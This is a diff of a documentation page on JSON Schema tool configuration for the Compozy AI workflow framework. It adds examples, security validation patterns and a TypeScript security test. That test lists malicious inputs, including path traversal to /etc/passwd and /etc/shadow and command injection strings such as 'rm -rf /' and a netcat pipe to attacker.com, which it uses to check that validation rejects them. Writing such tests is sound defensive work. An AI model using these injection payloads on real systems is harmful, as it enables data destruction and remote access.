@@ -1,26 +1,35 @@
 ---
 title: "Configuration Schemas"
-description: "Comprehensive guide to defining tool interfaces using JSON Schema for input/output validation"
+description: "Comprehensive guide to defining tool interfaces using JSON Schema for input/output validation in Compozy workflows"
 ---
+
+import { AlertTriangle, BookOpen, BrainCircuit, MessageSquare, Shield, ShieldCheck, TrendingUp, Zap } from "lucide-react";
 
 # Configuration Schemas
 
-Tool configuration schemas define the interface between AI agents and your tools. This guide covers how to create robust, validated tool configurations using JSON Schema.
+Tool configuration schemas define the interface between AI agents and your tools using JSON Schema Draft 7. This guide covers how to create robust, validated tool configurations that ensure type safety and seamless integration with AI workflows.
 
 ## Schema Fundamentals
+
+<Callout type="info">
+Compozy uses JSON Schema Draft 7 for validation and automatically generates LLM function definitions from your tool schemas.
+</Callout>
 
 ### Tool Configuration Structure
 
 Every tool configuration follows this schema:
 
+<Tabs>
+<Tab title="Basic Structure">
+
 ```yaml
 # Required fields
-resource: "tool"              # Must be "tool"
-id: "unique-tool-id"          # Unique identifier
+resource: "tool"              # Must be "tool" for autoloader
+id: "unique-tool-id"          # Unique identifier (kebab-case)
 description: "Tool purpose"   # Human-readable description
 
 # Optional execution configuration
-timeout: "30s"                # Execution timeout
+timeout: "30s"                # Execution timeout (Go duration)
 
 # Schema definitions
 input:                        # Input validation schema
@@ -40,12 +49,95 @@ env:                          # Environment variables
   VAR_NAME: "value"
 ```
 
-### JSON Schema Basics
-
-Compozy uses JSON Schema Draft 7 for validation:
+</Tab>
+<Tab title="Real Example">
 
 ```yaml
-# Basic types
+resource: "tool"
+id: "code-formatter"
+description: "A tool for formatting code with configurable options"
+timeout: "30s"
+
+input:
+  type: object
+  properties:
+    code:
+      type: string
+      description: The code to format
+      minLength: 1
+    language:
+      type: string
+      description: The programming language
+      enum: ["javascript", "typescript", "python", "go"]
+    indent_size:
+      type: integer
+      description: The number of spaces for indentation
+      minimum: 1
+      maximum: 8
+      default: 2
+    use_tabs:
+      type: boolean
+      description: Whether to use tabs instead of spaces
+      default: false
+  required:
+    - code
+    - language
+
+output:
+  type: object
+  properties:
+    formatted_code:
+      type: string
+      description: The formatted code
+  required:
+    - formatted_code
+
+with:
+  indent_size: 2
+  use_tabs: false
+
+env:
+  FORMATTER_VERSION: "1.0.0"
+```
+
+</Tab>
+</Tabs>
+
+### JSON Schema Validation
+
+<FeatureCardList>
+<FeatureCard
+  title="Type Safety"
+  description="Automatic validation of inputs and outputs ensures data integrity"
+  icon="ShieldCheck"
+  size="sm"
+/>
+<FeatureCard
+  title="LLM Integration"
+  description="Schemas automatically generate function definitions for AI agents"
+  icon="BrainCircuit"
+  size="sm"
+/>
+<FeatureCard
+  title="Error Prevention"
+  description="Catch validation errors before tool execution"
+  icon="AlertTriangle"
+  size="sm"
+/>
+<FeatureCard
+  title="Documentation"
+  description="Self-documenting tool interfaces with descriptions and examples"
+  icon="BookOpen"
+  size="sm"
+/>
+</FeatureCardList>
+
+### JSON Schema Types
+
+<Tabs>
+<Tab title="Basic Types">
+
+```yaml
 input:
   type: "object"
   properties:
@@ -67,17 +159,60 @@ input:
   required: ["name", "email"]
 ```
 
+</Tab>
+<Tab title="Advanced Types">
+
+```yaml
+input:
+  type: "object"
+  properties:
+    # Array with item validation
+    tags:
+      type: "array"
+      items:
+        type: "string"
+        minLength: 1
+      minItems: 1
+      maxItems: 10
+      uniqueItems: true
+    
+    # Nested object
+    metadata:
+      type: "object"
+      properties:
+        version:
+          type: "string"
+          pattern: "^\\d+\\.\\d+\\.\\d+$"
+        created_at:
+          type: "string"
+          format: "date-time"
+      required: ["version"]
+    
+    # Union types
+    value:
+      anyOf:
+        - type: "string"
+        - type: "number"
+        - type: "boolean"
+```
+
+</Tab>
+</Tabs>
+
 ## Input Schema Design
+
+<Callout type="tip">
+Design your input schemas with AI agents in mind. Clear descriptions and appropriate constraints help LLMs understand how to use your tools effectively.
+</Callout>
 
 ### Simple Input Schema
 
 For basic tools with straightforward parameters:
 
-```yaml
-# tools/file-reader.yaml
+```yaml title="tools/file-reader.yaml"
 resource: "tool"
 id: "file-reader"
-description: "Read file contents with encoding support"
+description: "Read file contents with encoding support and size limits"
 
 input:
   type: "object"
@@ -86,6 +221,7 @@ input:
       type: "string"
       description: "Path to the file to read"
       minLength: 1
+      pattern: "^[^\\0]+$"  # Prevent null bytes
     encoding:
       type: "string"
       description: "File encoding"
@@ -98,24 +234,26 @@ input:
       maximum: 10485760  # 10MB
       default: 1048576   # 1MB
   required: ["path"]
+  
+  # Security validation
+  additionalProperties: false
 ```
 
 ### Complex Input Schema
 
 For tools with nested objects and arrays:
 
-```yaml
-# tools/data-processor.yaml
+```yaml title="tools/data-processor.yaml"
 resource: "tool"
 id: "data-processor"
-description: "Process structured data with transformations"
+description: "Process structured data with configurable transformations"
 
 input:
   type: "object"
   properties:
     data:
       type: "array"
-      description: "Input data array"
+      description: "Input data array to process"
       items:
         type: "object"
         additionalProperties: true
@@ -131,6 +269,7 @@ input:
           type:
             type: "string"
             enum: ["filter", "map", "reduce", "sort", "group"]
+            description: "Type of transformation to apply"
 
           config:
             type: "object"
@@ -139,11 +278,13 @@ input:
               field:
                 type: "string"
                 description: "Field to operate on"
+                minLength: 1
               operation:
                 type: "string"
                 description: "Operation to perform"
+                minLength: 1
               value:
-                description: "Operation value"
+                description: "Operation value (type depends on operation)"
                 anyOf:
                   - type: "string"
                   - type: "number"
@@ -151,7 +292,10 @@ input:
                   - type: "array"
                   - type: "object"
             required: ["field", "operation"]
+            additionalProperties: false
         required: ["type", "config"]
+      minItems: 1
+      maxItems: 100
 
     output_format:
       type: "string"
@@ -180,17 +324,17 @@ input:
       additionalProperties: false
 
   required: ["data", "transformations"]
+  additionalProperties: false
 ```
 
 ### Conditional Schema
 
 Use conditional logic for dynamic validation:
 
-```yaml
-# tools/api-client.yaml
+```yaml title="tools/api-client.yaml"
 resource: "tool"
 id: "api-client"
-description: "HTTP client with conditional validation"
+description: "HTTP client with method-specific validation"
 
 input:
   type: "object"
@@ -198,19 +342,24 @@ input:
     method:
       type: "string"
       enum: ["GET", "POST", "PUT", "DELETE", "PATCH"]
+      description: "HTTP method"
 
     url:
       type: "string"
       format: "uri"
       description: "Request URL"
+      pattern: "^https?://"
 
     headers:
       type: "object"
+      description: "HTTP headers"
       additionalProperties:
         type: "string"
+        minLength: 1
+      default: {}
 
     body:
-      description: "Request body"
+      description: "Request body for POST/PUT/PATCH"
       anyOf:
         - type: "string"
         - type: "object"
@@ -218,36 +367,47 @@ input:
 
     auth:
       type: "object"
+      description: "Authentication configuration"
       properties:
         type:
           type: "string"
           enum: ["basic", "bearer", "api_key"]
         credentials:
           type: "object"
+          description: "Authentication credentials"
       required: ["type", "credentials"]
 
   required: ["method", "url"]
+  additionalProperties: false
 
-  # Conditional validation
-  if:
-    properties:
-      method:
-        const: "POST"
-  then:
-    required: ["method", "url", "body"]
-  else:
-    not:
-      required: ["body"]
+  # Conditional validation - require body for write operations
+  allOf:
+    - if:
+        properties:
+          method:
+            enum: ["POST", "PUT", "PATCH"]
+      then:
+        required: ["method", "url", "body"]
+    - if:
+        properties:
+          method:
+            enum: ["GET", "DELETE"]
+      then:
+        not:
+          required: ["body"]
 ```
 
 ## Output Schema Design
 
+<Callout type="note">
+Output schemas are validated after tool execution to ensure your tools return consistent, well-structured data that AI agents can reliably process.
+</Callout>
+
 ### Structured Output Schema
 
-Define clear output contracts:
+Define clear output contracts for predictable tool behavior:
 
-```yaml
-# tools/weather-api.yaml
+```yaml title="tools/weather-api.yaml"
 resource: "tool"
 id: "weather-api"
 description: "Weather data fetcher with structured output"
@@ -257,47 +417,62 @@ output:
   properties:
     location:
       type: "object"
+      description: "Location information"
       properties:
         city:
           type: "string"
+          description: "City name"
         country:
           type: "string"
+          description: "Country name"
         coordinates:
           type: "object"
+          description: "Geographic coordinates"
           properties:
             lat:
               type: "number"
+              minimum: -90
+              maximum: 90
             lon:
               type: "number"
+              minimum: -180
+              maximum: 180
           required: ["lat", "lon"]
       required: ["city", "country", "coordinates"]
 
     current:
       type: "object"
+      description: "Current weather conditions"
       properties:
         temperature:
           type: "number"
           description: "Temperature in Celsius"
         humidity:
           type: "integer"
+          description: "Humidity percentage"
           minimum: 0
           maximum: 100
         pressure:
           type: "number"
+          description: "Atmospheric pressure in hPa"
           minimum: 0
         wind_speed:
           type: "number"
+          description: "Wind speed in m/s"
           minimum: 0
         conditions:
           type: "string"
+          description: "Weather conditions"
           enum: ["sunny", "cloudy", "rainy", "snowy", "stormy"]
         timestamp:
           type: "string"
           format: "date-time"
+          description: "Timestamp of observation"
       required: ["temperature", "humidity", "conditions", "timestamp"]
 
     forecast:
       type: "array"
+      description: "Weather forecast (up to 7 days)"
       items:
         type: "object"
         properties:
@@ -306,8 +481,10 @@ output:
             format: "date"
           temperature_high:
             type: "number"
+            description: "High temperature in Celsius"
           temperature_low:
             type: "number"
+            description: "Low temperature in Celsius"
           conditions:
             type: "string"
             enum: ["sunny", "cloudy", "rainy", "snowy", "stormy"]
@@ -317,19 +494,24 @@ output:
 
     metadata:
       type: "object"
+      description: "Response metadata"
       properties:
         source:
           type: "string"
+          description: "Data source"
         last_updated:
           type: "string"
           format: "date-time"
+          description: "Last update timestamp"
         units:
           type: "string"
           enum: ["metric", "imperial"]
           default: "metric"
+          description: "Unit system"
       required: ["source", "last_updated"]
 
   required: ["location", "current", "metadata"]
+  additionalProperties: false
 ```
 
 ### Flexible Output Schema
@@ -598,22 +780,52 @@ input:
 
 ## Schema Validation Best Practices
 
+<FeatureCardList>
+<FeatureCard
+  title="Security First"
+  description="Always validate inputs to prevent injection attacks and ensure data integrity"
+  icon="Shield"
+  size="sm"
+/>
+<FeatureCard
+  title="Clear Descriptions"
+  description="Provide detailed descriptions for AI agents to understand parameter usage"
+  icon="MessageSquare"
+  size="sm"
+/>
+<FeatureCard
+  title="Appropriate Limits"
+  description="Set reasonable constraints to prevent abuse and ensure performance"
+  icon="TrendingUp"
+  size="sm"
+/>
+<FeatureCard
+  title="Fail Fast"
+  description="Validate early to provide clear error messages and prevent execution issues"
+  icon="Zap"
+  size="sm"
+/>
+</FeatureCardList>
+
 ### Input Validation
 
+<Tabs>
+<Tab title="Comprehensive Example">
+
 ```yaml
-# Comprehensive input validation
+# Production-ready input validation
 input:
   type: "object"
   properties:
-    # String validation
+    # String validation with security patterns
     name:
       type: "string"
       minLength: 1
       maxLength: 100
-      pattern: "^[a-zA-Z0-9\\s-_]+$"
+      pattern: "^[a-zA-Z0-9\\s\\-_]+$"
       description: "Alphanumeric name with spaces, hyphens, underscores"
 
-    # Numeric validation
+    # Numeric validation with business rules
     quantity:
       type: "integer"
       minimum: 1
@@ -621,24 +833,27 @@ input:
       multipleOf: 1
       description: "Quantity must be a positive integer"
 
-    # Array validation
+    # Array validation with constraints
     tags:
       type: "array"
       items:
         type: "string"
         minLength: 1
         maxLength: 50
+        pattern: "^[a-zA-Z0-9\\-_]+$"
       minItems: 1
       maxItems: 10
       uniqueItems: true
-      description: "Array of unique tags"
+      description: "Array of unique alphanumeric tags"
 
-    # Object validation
+    # Object validation with strict properties
     metadata:
       type: "object"
       properties:
         created_by:
           type: "string"
+          minLength: 1
+          maxLength: 100
         department:
           type: "string"
           enum: ["sales", "marketing", "engineering", "support"]
@@ -661,10 +876,12 @@ input:
     notification_type:
       type: "string"
       enum: ["email", "sms", "push"]
+      description: "Notification delivery method"
 
   required: ["name", "quantity"]
+  additionalProperties: false
 
-  # Additional validation rules
+  # Conditional validation rules
   if:
     properties:
       notification_type:
@@ -674,8 +891,59 @@ input:
       email:
         type: "string"
         format: "email"
+        description: "Email address for notifications"
     required: ["email"]
 ```
+
+</Tab>
+<Tab title="Security Patterns">
+
+```yaml
+# Security-focused validation patterns
+input:
+  type: "object"
+  properties:
+    # File path validation (prevent directory traversal)
+    file_path:
+      type: "string"
+      pattern: "^[a-zA-Z0-9\\._\\-/]+$"
+      not:
+        anyOf:
+          - pattern: "\\.\\."
+          - pattern: "^/"
+          - pattern: "\\0"
+      description: "Safe file path without traversal"
+
+    # Command validation (prevent injection)
+    command:
+      type: "string"
+      enum: ["start", "stop", "restart", "status"]
+      description: "Allowed system commands"
+
+    # URL validation (restrict to HTTPS)
+    api_url:
+      type: "string"
+      format: "uri"
+      pattern: "^https://"
+      description: "HTTPS URL only"
+
+    # Size limits (prevent DoS)
+    content:
+      type: "string"
+      maxLength: 1048576  # 1MB
+      description: "Content limited to 1MB"
+
+    # Environment variable validation
+    env_var:
+      type: "string"
+      pattern: "^[A-Z0-9_]+$"
+      description: "Valid environment variable name"
+
+  additionalProperties: false
+```
+
+</Tab>
+</Tabs>
 
 ### Error Response Schema
 
@@ -734,14 +1002,27 @@ output:
       required: ["success", "error"]
 ```
 
-## Schema Testing
+## Schema Testing & Validation
+
+<Callout type="tip">
+Compozy automatically validates schemas at runtime, but testing your schemas during development helps catch issues early and ensures robust tool behavior.
+</Callout>
+
+### Schema Testing Strategy
+
+<List>
+<ListItem>**Unit Testing**: Test schema validation with various inputs</ListItem>
+<ListItem>**Integration Testing**: Test schema validation within actual tool execution</ListItem>
+<ListItem>**Security Testing**: Test with malicious inputs and edge cases</ListItem>
+<ListItem>**Performance Testing**: Test with large inputs and complex schemas</ListItem>
+</List>
 
 ### Validation Testing
 
-Test your schemas thoroughly:
+<Tabs>
+<Tab title="Basic Testing">
 
-```typescript
-// schema-validator.test.ts
+```typescript title="schema-validator.test.ts"
 import { validateSchema } from './schema-validator';
 
 describe('Tool Schema Validation', () => {
@@ -760,6 +1041,7 @@ describe('Tool Schema Validation', () => {
     const validInput = { name: 'John', age: 30 };
     const result = validateSchema(validInput, toolSchema.input);
     expect(result.valid).toBe(true);
+    expect(result.errors).toHaveLength(0);
   });
 
   test('should reject missing required field', () => {
@@ -775,7 +1057,98 @@ describe('Tool Schema Validation', () => {
     expect(result.valid).toBe(false);
     expect(result.errors).toContain('age must be integer');
   });
+
+  test('should handle edge cases', () => {
+    const edgeCases = [
+      { name: '', age: 25 },  // Empty string
+      { name: 'John', age: -5 },  // Negative number
+      { name: 'John', age: 25, extra: 'field' },  // Extra property
+    ];
+
+    edgeCases.forEach(input => {
+      const result = validateSchema(input, toolSchema.input);
+      expect(result.valid).toBe(false);
+    });
+  });
 });
+```
+
+</Tab>
+<Tab title="Security Testing">
+
+```typescript title="schema-security.test.ts"
+import { validateSchema } from './schema-validator';
+
+describe('Schema Security Validation', () => {
+  const secureSchema = {
+    input: {
+      type: 'object',
+      properties: {
+        file_path: {
+          type: 'string',
+          pattern: '^[a-zA-Z0-9\\._\\-/]+$',
+          not: {
+            anyOf: [
+              { pattern: '\\.\\.' },
+              { pattern: '^/' },
+              { pattern: '\\0' }
+            ]
+          }
+        },
+        command: {
+          type: 'string',
+          enum: ['start', 'stop', 'restart', 'status']
+        }
+      },
+      required: ['file_path', 'command'],
+      additionalProperties: false
+    }
+  };
+
+  test('should reject directory traversal attempts', () => {
+    const maliciousInputs = [
+      { file_path: '../../../etc/passwd', command: 'start' },
+      { file_path: './../../secrets', command: 'start' },
+      { file_path: '/etc/shadow', command: 'start' },
+      { file_path: 'file\\0.txt', command: 'start' }
+    ];
+
+    maliciousInputs.forEach(input => {
+      const result = validateSchema(input, secureSchema.input);
+      expect(result.valid).toBe(false);
+    });
+  });
+
+  test('should reject command injection attempts', () => {
+    const maliciousInputs = [
+      { file_path: 'file.txt', command: 'start; rm -rf /' },
+      { file_path: 'file.txt', command: 'start && evil_command' },
+      { file_path: 'file.txt', command: 'start | nc attacker.com 4444' }
+    ];
+
+    maliciousInputs.forEach(input => {
+      const result = validateSchema(input, secureSchema.input);
+      expect(result.valid).toBe(false);
+    });
+  });
+
+  test('should accept valid inputs', () => {
+    const validInputs = [
+      { file_path: 'data/file.txt', command: 'start' },
+      { file_path: 'logs/app.log', command: 'status' },
+      { file_path: 'config.yaml', command: 'restart' }
+    ];
+
+    validInputs.forEach(input => {
+      const result = validateSchema(input, secureSchema.input);
+      expect(result.valid).toBe(true);
+    });
+  });
+});
+```
+
+</Tab>
+</Tabs>
 ```
 
 ### Schema Documentation
@@ -826,7 +1199,25 @@ function extractConstraints(schema: any): string[] {
 
 ## Next Steps
 
-- [External Integrations](./external-integrations) - Connect to external services
-- [Testing & Debugging](./testing-debugging) - Validate your schemas
-- [Performance & Security](./performance-security) - Schema optimization
-- [Advanced Patterns](./advanced-patterns) - Complex schema patterns
+<ReferenceCardList>
+<ReferenceCard
+  title="Runtime Environment"
+  description="Learn about Bun runtime, security model, and execution environment"
+  href="/docs/core/tools/runtime-environment"
+/>
+<ReferenceCard
+  title="External Integrations"
+  description="Connect tools to external services and APIs"
+  href="/docs/core/tools/external-integrations"
+/>
+<ReferenceCard
+  title="Testing & Debugging"
+  description="Validate your schemas and debug tool execution"
+  href="/docs/core/tools/testing-debugging"
+/>
+<ReferenceCard
+  title="Performance & Security"
+  description="Optimize schemas and implement security best practices"
+  href="/docs/core/tools/performance-security"
+/>
+</ReferenceCardList>
